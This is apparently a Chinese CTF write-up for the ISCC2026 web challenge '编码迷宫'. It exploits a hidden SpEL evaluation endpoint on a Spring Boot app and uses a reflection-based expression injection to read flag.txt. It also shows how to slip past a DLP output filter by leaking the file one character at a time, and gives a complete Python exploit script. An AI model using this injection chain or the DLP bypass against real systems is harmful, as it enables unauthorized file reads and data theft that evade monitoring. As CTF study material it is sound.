+++
title = "编码迷宫"
date = "2026-05-17"
type = "post"
categories = ["ISCC2026"]
tags = ["ISCC2026"]
draft = false
+++

Web-编码迷宫
============

信息搜集
--------

打开题目，页面本身是一个签名验证功能，前端校验文件名是否合法。但抓包或查看源码后可以发现一个隐藏的调试端点：/api/route?expr=，它接受一个表达式参数并返回求值结果。访问 /actuator/info 也能确认这是一个 Spring Boot 应用。

直接传简单表达式测试：

-   ?expr=1+1 → 2

-   ?expr='hello'.length() → 5

说明后端是一个 **SpEL（Spring Expression Language）执行器**，且没有对表达式内容做严格限制。

利用链条
--------

目标文件是工作目录下的 flag.txt。Java 里读取本地文件的标准路径是：

Class.forName("java.nio.file.Paths")

→ Paths.get("flag.txt")

→ Files.readString(Path)

问题是如何在 SpEL 中完成这一步调用。SpEL 支持通过反射获取 java.lang.reflect.Method 对象并调用：

1.  

> **获取** Class.forName(String)\
> ''.class.class 拿到的是 java.lang.Class 的 Class 对象，它身上的 methods\[2\] 恰好就是 forName(String) 这个静态方法。

1.  2.  

> **获取** Paths.get(String)\
> 拿到 forName 的 Method 后，调用它加载 java.nio.file.Paths，再取其 methods\[0\] 即为 get(String)。

1.  2.  

> **获取** Files.readString(Path)\
> 同样用 forName 加载 java.nio.file.Files，通过遍历 declaredMethods 定位到单参数版 readString，在 JDK 版本中它的位置是索引 61。

1.  

将这三点拼成一个 SpEL 集合选择表达式：

{

\#cf=''.class.class.methods\[2\],

\#pm=\#cf('java.nio.file.Paths').methods\[0\],

\#path=\#pm('flag.txt'),

\#m=\#cf('java.nio.file.Files').declaredMethods\[61\],

\#m(\#path)

}\[4\]

花括号 {...}\[4\] 的写法是利用 SpEL 的集合字面量语法——内部是一个变量定义链，最后一个表达式 \#m(\#path) 的返回值位于索引 4，取出来就是我们想要的文件内容。

绕过 DLP
--------

直接提交上述表达式，服务器返回的不是 flag 内容，而是：

\[DLP System\] Warning: Sensitive flag format detected in output stream. Blocked!

后端对输出流做了正则匹配，一旦检测到 ISCC{...} 格式就直接拦截。因此不能一次性读出全文。

绕过方式很简单——**按字节泄露**：

1.  先计算文件内容的总字节数：在高读取表达式后面拼接 .bytes.length

<!-- -->

1.  获取长度后，循环地用 \[i\] 下标逐个取出字符

2.  将字符拼接即可恢复完整 flag

这样每次 HTTP 响应只含单个字符，不触发 DLP 的敏感格式检测。

自动化脚本
----------

import requests

BASE = "http://39.105.213.28:12603/api/route"

FOR\_NAME = "''.class.class.methods\[2\]"

PATHS\_GET = "\#cf('java.nio.file.Paths').methods\[0\]"

FILES\_READ\_STRING = "\#cf('java.nio.file.Files').declaredMethods\[61\]"

def query(expr: str) -&gt; str:

r = requests.get(BASE, params={"expr": expr}, timeout=20)

r.raise\_for\_status()

return r.text

def file\_read\_expr() -&gt; str:

return (

"{"

f"\#cf={FOR\_NAME},"

f"\#pm={PATHS\_GET},"

"\#path=\#pm('flag.txt'),"

f"\#m={FILES\_READ\_STRING},"

"\#m(\#path)"

"}\[4\]"

)

if \_\_name\_\_ == "\_\_main\_\_":

read\_file = file\_read\_expr()

n = int(query(read\_file + ".bytes.length"))

result = ""

for i in range(n):

ch = query(f"{read\_file}\[{i}\]")

if ch == "\\n":

break

result += ch

print(result)

输出
----

ISCC{SpEL\_D0ubl3\_Enc0d1ng\_Bypass\_202605}
